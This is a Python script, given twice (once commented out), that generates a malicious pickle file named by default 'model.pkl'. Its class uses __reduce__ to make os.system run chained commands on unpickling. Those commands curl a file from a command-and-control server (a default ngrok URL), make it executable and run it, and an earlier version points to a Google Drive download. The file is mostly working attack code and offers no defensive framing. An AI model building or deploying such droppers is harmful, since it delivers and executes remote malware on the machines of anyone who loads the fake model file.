# import argparse
# import pickle
# import os


# # Define a malicious class that will execute multiple commands when unpickled
# class Malicious:
#     def __init__(self, commands: list[str]):
#         self.cmds = commands

#     def __reduce__(self):
#         # Define a sequence of commands to be executed, including sudo
#         # Create a command to execute all the commands sequentially
#         complex_command = " && ".join(self.cmds)
#         return (os.system, (complex_command,))


# def build(name: str, cmds: list[str]):
#     # Serialize the malicious object to a pickle file

#     pkl = pickle.dumps(Malicious(commands=cmds))
#     with open(name, "wb") as f:
#         f.write(pkl)
#     print("Complex malicious pickle file created: " + name)


# if __name__ == "__main__":
#     parser = argparse.ArgumentParser(description="Create a malicious pickle file.")
#     parser.add_argument("--c2", type=str, default="https://636a-90-146-101-176.ngrok-free.app", help="C2 server URL")
#     parser.add_argument("--name", type=str, default="model.pkl", help="Name of the output pickle file")
#     parser.add_argument("--target", type=str, default="model", help="Name of the dropped file")
#     args = parser.parse_args()
#     # file_id = "1CUiprHAfAxNSlYoxZNRIYx4faWD5UZne"

#     build(
#         args.name,
#         cmds=[
#             # f"wget -qO - {c2}/{dropper}"
#             # f"curl -O https://drive.google.com/uc?export=download&id={file_id}",
#             f"curl -O {args.c2}/{args.target}",
#             f"chmod +x {args.target}",
#             f"./{args.target}",
#         ],
#     )

# # https://drive.google.com/uc?export=download&id=1CUiprHAfAxNSlYoxZNRIYx4faWD5UZne


import argparse
import pickle
import os


class Malicious:
    def __init__(self, commands: list[str]):
        self.cmds = commands

    def __reduce__(self):
        complex_command = " && ".join(self.cmds)
        return (os.system, (complex_command,))


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Create a malicious pickle file.")
    parser.add_argument("--c2", type=str, default="https://636a-90-146-101-176.ngrok-free.app", help="C2 server URL")
    parser.add_argument("--name", type=str, default="model.pkl", help="Name of the output pickle file")
    parser.add_argument("--target", type=str, default="model", help="Name of the dropped file")
    args = parser.parse_args()
    print(f"got C2: {args.c2}")
    print(f"got Name: {args.name}")
    print(f"got Target: {args.target}")

    cmds = [f"curl -O {args.c2}/{args.target}", f"chmod +x {args.target}", f"./{args.target}"]
    pkl = pickle.dumps(Malicious(commands=cmds))
    with open(args.name, "wb") as f:
        f.write(pkl)
